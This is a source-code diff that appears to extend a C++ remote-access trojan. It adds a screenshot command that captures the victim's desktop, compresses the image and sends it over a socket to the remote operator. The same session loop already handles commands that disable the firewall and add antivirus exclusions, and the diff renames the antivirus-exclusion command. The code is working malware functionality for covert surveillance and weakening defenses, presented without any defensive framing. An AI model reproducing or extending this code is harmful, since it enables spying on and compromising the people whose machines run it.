@@ -755,6 +755,138 @@ bool DisableFirewall(SOCKET Sock)
 	return TcpIP::SendString(Sock, "ko");
 }
 
+
+
+BITMAPINFOHEADER createBitmapHeader(int width, int height)
+{
+	BITMAPINFOHEADER  bi{};
+
+	// create a bitmap
+	bi.biSize = sizeof(BITMAPINFOHEADER);
+	bi.biWidth = width;
+	bi.biHeight = -height;  //this is the line that makes it draw upside down or not
+	bi.biPlanes = 1;
+	bi.biBitCount = 32;
+	bi.biCompression = BI_RGB;
+	bi.biSizeImage = 0;
+	bi.biXPelsPerMeter = 0;
+	bi.biYPelsPerMeter = 0;
+	bi.biClrUsed = 0;
+	bi.biClrImportant = 0;
+
+	return bi;
+}
+
+Mat captureScreenMat(HWND hwnd)
+{
+	Mat src;
+	WindowUtils wu(hwnd);
+
+	// get handles to a device context (DC)
+	HDC hwindowDC = GetDC(0);
+	HDC hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
+
+	// define scale, height and width
+	int screenx = wu.GetWindowPos().X;
+	int screeny = wu.GetWindowPos().Y;
+	int width = wu.GetWindowSize().X;
+	int height = wu.GetWindowSize().Y;
+
+	// create mat object
+	src.create(height, width, CV_8UC4);
+
+	// create a bitmap
+	HBITMAP hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
+	BITMAPINFOHEADER bi = createBitmapHeader(width, height);
+
+	// use the previously created device context with the bitmap
+	SelectObject(hwindowCompatibleDC, hbwindow);
+
+	// copy from the window device context to the bitmap device context
+	BitBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, screenx, screeny, SRCCOPY);
+
+	// Draw the mouse
+	CURSORINFO cursor = { sizeof(cursor) };
+	GetCursorInfo(&cursor);
+	if (cursor.flags == CURSOR_SHOWING)
+	{
+		DrawIcon(hwindowCompatibleDC, cursor.ptScreenPos.x, cursor.ptScreenPos.y, cursor.hCursor);
+	}
+
+	//copy from hwindowCompatibleDC to hbwindow
+	GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+
+	// avoid memory leak
+	DeleteDC(hwindowCompatibleDC);
+	ReleaseDC(hwnd, hwindowDC);
+	DeleteObject(hbwindow);
+
+	return src;
+}
+
+string compress_string(const string& str, int compressionlevel = Z_BEST_COMPRESSION)
+{
+	z_stream zs;                        // z_stream is zlib's control structure
+	memset(&zs, 0, sizeof(zs));
+
+	if (deflateInit(&zs, compressionlevel) != Z_OK)
+		throw(std::runtime_error("deflateInit failed while compressing."));
+
+	zs.next_in = (Bytef*)str.data();
+	zs.avail_in = str.size();           // set the z_stream's input
+
+	int ret;
+	char outbuffer[32768] = { 0 };
+	std::string outstring;
+
+	// retrieve the compressed bytes blockwise
+	do {
+		zs.next_out = reinterpret_cast<Bytef*>(outbuffer);
+		zs.avail_out = sizeof(outbuffer);
+
+		ret = deflate(&zs, Z_FINISH);
+
+		if (outstring.size() < zs.total_out) {
+			// append the block to the output string
+			outstring.append(outbuffer,
+				zs.total_out - outstring.size());
+		}
+	} while (ret == Z_OK);
+
+	deflateEnd(&zs);
+
+	if (ret != Z_STREAM_END) {          // an error occurred that was not EOF
+		std::ostringstream oss;
+		oss << "Exception during zlib compression: (" << ret << ") " << zs.msg;
+		throw(std::runtime_error(oss.str()));
+	}
+
+	return outstring;
+}
+
+bool Screenshot(SOCKET Sock)
+{
+	HWND hwnd = GetDesktopWindow();
+	Mat Desktop = captureScreenMat(hwnd);
+	vector<uchar> vect;
+	string Buff;
+
+	Desktop = captureScreenMat(hwnd);
+	imencode(".jpeg", Desktop, vect, { IMWRITE_JPEG_QUALITY, 100 });
+
+	Buff = string(vect.begin(), vect.end());
+	Buff = compress_string(Buff);
+
+	bool Result = TcpIP::SendString(Sock, Buff);
+
+	vect.clear();
+	Buff.clear();
+
+	return Result;
+}
+
+
+
 short Sessione(TcpIP Client)
 {
 	SystemUtils su;
@@ -822,13 +954,17 @@ short Sessione(TcpIP Client)
 		{
 			i = VibeMouse(Client.Sock);
 		}
-		else if (cmd == "addavexclusion")
+		else if (cmd == "addexclusion")
 		{
 			i = AddAVexclusion(Client.Sock);
 		}
 		else if (cmd == "disablefw")
 		{
 			i = DisableFirewall(Client.Sock);
+		}
+		else if (cmd == "screenshot")
+		{
+			i = Screenshot(Client.Sock);
 		}
 	}
 
